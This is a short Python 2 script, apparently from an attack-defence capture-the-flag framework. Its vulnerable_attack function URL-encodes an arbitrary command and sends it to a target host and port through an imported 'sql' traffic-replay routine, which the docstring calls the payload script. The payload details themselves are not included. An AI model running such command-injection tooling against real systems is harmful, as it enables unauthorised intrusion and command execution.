#!/usr/bin/env python

from framework.http import http
from framework.config import *
from framework.function import *
import urllib
import traceback
from replay import *

def vulnerable_attack(target,target_port,cmd):
        
    '''
    this is the payload script for vuln:

    replay with some traffic

    '''
    
    try:           
        print "cmd => " + cmd
        cmd = urllib.quote(cmd)
        res = sequence_attack(target,target_port,cmd,'sql',3)    
    except Exception,e:
        debug_print(traceback.format_exc())     
        dump_error("attack failed",target,"vulnerable attack")
        res = "error"

    return res




